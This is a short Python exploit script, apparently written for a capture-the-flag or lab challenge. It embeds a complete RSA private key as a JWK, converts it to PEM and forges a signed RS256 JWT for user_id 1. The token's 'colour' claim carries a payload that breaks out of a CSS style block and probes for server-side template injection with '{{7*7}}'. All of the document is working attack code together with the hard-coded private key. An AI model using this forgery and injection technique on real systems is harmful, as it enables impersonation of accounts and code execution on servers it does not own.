"""
id    1|
kid    default|
kty    RSA|
d    RDt9YficFR77ffWSe2pUoASMpj385D9G7ZACsw4cArrZZmeuvAhkPFZIhGBSqp_BJSLSKn5gDLevvxYMJ1B_a0YrGbdSl5KnkQA4Bqy5bQplgbseKrc1dUZ99OTH6pRVfCX3r_jYRVlz95FJFWe_tPrN6GZi_UJG4mhikCztTlE|
dp    mkDoM40xDePfQ_h8KVxOZFWg8M3RmcwtR-WgNxiA1cSyFb-SzZc9jFXon3cqdlt1JC6tvwuqG-0BOJig8w-M8w|
dq    xvJkkzNScmPy8mXlas---J5Y6uBMLaSr6f1eN9ZCp-HQC-RWsZkdsfkkA_YY6Q4fJ3r3fYXe1LRpe1flffDrGQ|
e    AQAB|
n    yH_utSCKoawZ0GCbMpgWbruhrjxvReqGshuS5lUW1wVcofKs4e2pKenD0MPatNtHQYGR-_0i_KJDIkKiV2cvydM4Fx7LWU3Q-rN49b_sw4XqjuE2v5HuAUIwF4wBCBR90ZcIEZv_SMprjxGNFnbX5h0CuKIlj8VVGsx9t3CHrsM|
p    9CgncwPxNHq5UrfwoOehxxS9KP2cGHIOHBNdhQ1_JstaMRCXiTQSmGdCWBRKpgVTlVuC-BnTnfv8_iAsMWQ62w|
q    0jmpPEaBvRWdGnMA3Ze8LRy7BRgp1EZ9arE3eet-9mWdIjlLQkbRq_s4W_B701XCvog3R4AYJicZBD6pMwX8OQ|
qi    und1FyMS6r8Alb9SFTCkmy_yzGOrhPU2tcG0HtsZpuNwZTzb5w5SyIQi1HtX7iPimDXXTtusLuUxTKIDlmO5qg
"""

from jwt import encode
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from base64 import urlsafe_b64decode

key = {
    "id": 1,
    "kid": "default",
    "kty": "RSA",
    "d": "RDt9YficFR77ffWSe2pUoASMpj385D9G7ZACsw4cArrZZmeuvAhkPFZIhGBSqp_BJSLSKn5gDLevvxYMJ1B_a0YrGbdSl5KnkQA4Bqy5bQplgbseKrc1dUZ99OTH6pRVfCX3r_jYRVlz95FJFWe_tPrN6GZi_UJG4mhikCztTlE",
    "dp": "mkDoM40xDePfQ_h8KVxOZFWg8M3RmcwtR-WgNxiA1cSyFb-SzZc9jFXon3cqdlt1JC6tvwuqG-0BOJig8w-M8w",
    "dq": "xvJkkzNScmPy8mXlas---J5Y6uBMLaSr6f1eN9ZCp-HQC-RWsZkdsfkkA_YY6Q4fJ3r3fYXe1LRpe1flffDrGQ",
    "e": "AQAB",
    "n": "yH_utSCKoawZ0GCbMpgWbruhrjxvReqGshuS5lUW1wVcofKs4e2pKenD0MPatNtHQYGR-_0i_KJDIkKiV2cvydM4Fx7LWU3Q-rN49b_sw4XqjuE2v5HuAUIwF4wBCBR90ZcIEZv_SMprjxGNFnbX5h0CuKIlj8VVGsx9t3CHrsM",
    "p": "9CgncwPxNHq5UrfwoOehxxS9KP2cGHIOHBNdhQ1_JstaMRCXiTQSmGdCWBRKpgVTlVuC-BnTnfv8_iAsMWQ62w",
    "q": "0jmpPEaBvRWdGnMA3Ze8LRy7BRgp1EZ9arE3eet-9mWdIjlLQkbRq_s4W_B701XCvog3R4AYJicZBD6pMwX8OQ",
    "qi": "und1FyMS6r8Alb9SFTCkmy_yzGOrhPU2tcG0HtsZpuNwZTzb5w5SyIQi1HtX7iPimDXXTtusLuUxTKIDlmO5qg",
}

def jwk_to_pem_private(jwk: dict) -> str:
    def b64_to_int(value):
        return int.from_bytes(urlsafe_b64decode(value + "=="), 'big')

    private_key = rsa.RSAPrivateNumbers(
        p=b64_to_int(jwk['p']),
        q=b64_to_int(jwk['q']),
        d=b64_to_int(jwk['d']),
        dmp1=b64_to_int(jwk['dp']),
        dmq1=b64_to_int(jwk['dq']),
        iqmp=b64_to_int(jwk['qi']),
        public_numbers=rsa.RSAPublicNumbers(
            e=b64_to_int(jwk['e']),
            n=b64_to_int(jwk['n'])
        )
    ).private_key()

    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    return pem_private.decode()

def create_token(payload) -> str:
    pem_private = jwk_to_pem_private(key)
    colour = payload
    token = encode(payload={
        'user_id': 1,
        'colour': colour,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(minutes=120)
    }, algorithm='RS256', headers={'kid': key['kid']}, key=pem_private)
    return token

PAYLOAD = '"#f8f9fa";}</style>{{7*7}}<style>'
print(create_token(PAYLOAD))